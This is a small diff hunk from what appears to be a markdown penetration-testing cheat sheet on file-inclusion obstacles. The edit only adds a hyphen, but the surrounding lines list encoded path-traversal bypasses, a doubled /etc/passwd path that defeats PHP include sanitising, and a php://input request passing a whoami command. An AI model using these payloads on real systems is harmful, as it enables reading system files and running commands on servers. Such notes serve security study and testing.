@@ -158,7 +158,7 @@ Common Obstacles:
 ```
 ..%c0%af or ..%252f
  ....// or ....\/
-/etc/etc/passwd  _‘etc’ may be sanitised by php include function_
+/etc/etc/passwd  -_‘etc’ may be sanitised by php include function_
 POST ?page=php://input&cmd=whoami
 ```
 
